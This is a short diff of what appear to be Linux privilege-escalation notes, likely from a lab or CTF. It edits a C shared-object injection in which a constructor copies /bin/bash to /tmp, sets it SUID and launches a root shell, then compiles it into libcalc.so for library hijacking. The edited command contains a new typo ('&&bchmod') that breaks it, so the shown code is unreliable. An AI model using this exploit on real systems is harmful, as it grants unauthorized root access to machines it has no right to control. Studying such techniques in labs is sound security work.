@@ -47,15 +47,17 @@
    Create C file Type Some Commands
        
        #include <stdio.h>
-       #include <stdib.h>
-       static void inject()_attribute_((constructor));
+       #include <stdlib.h>
 
-       void inject(){
+       static void inject()__attribute__((constructor));
 
-       system("cp/bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
-       }
+      void inject() {
+        system("cp /bin/bash /tmp/bash &&bchmod +s /tmp/bash && /tmp/bash -p");
+}  
+   
+   ## Complie
 
-   gcc -shared -fpic -o /home/user/.config/libcalc.so /home/user/libcalc.c
+       gcc -shared -fpic -o /home/user/.config/libcalc.so /home/user/libcalc.c
 
 
 
